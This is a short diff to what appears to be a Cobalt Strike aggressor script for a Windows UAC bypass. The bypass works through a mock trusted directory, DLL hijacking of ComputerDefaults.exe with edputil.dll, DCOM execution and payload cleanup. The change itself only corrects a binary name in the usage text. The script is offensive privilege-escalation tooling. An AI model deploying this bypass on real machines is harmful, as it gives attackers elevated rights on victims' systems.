@@ -10,13 +10,13 @@ Step 5: Use DCOM to execute \"C:\\Windows \\System32\\<desired executable>\"
 Step 6: Delete the DLL payload on \"C:\\Windows\\Tasks\"
 ================================================================================
 
-Example: bof-trustedpath-uacbypass ComputerFaults.exe /root/edputil.dll");
+Example: bof-trustedpath-uacbypass ComputerDefaults.exe /root/edputil.dll");
 
 alias bof-trustedpath-uacbypass {
 	local('$args');
 	$barch  = barch($1);
 	if(size(@_) < 3){
-		berror($1, "Missing arugment. Example: bof-trustedpath-uacbypass ComputerFaults.exe /root/edputil.dll");
+		berror($1, "Missing arugment. Example: bof-trustedpath-uacbypass ComputerDefaults.exe /root/edputil.dll");
 		return;
 	}
 	$targetProc = split("\\\\", $2)[-1];
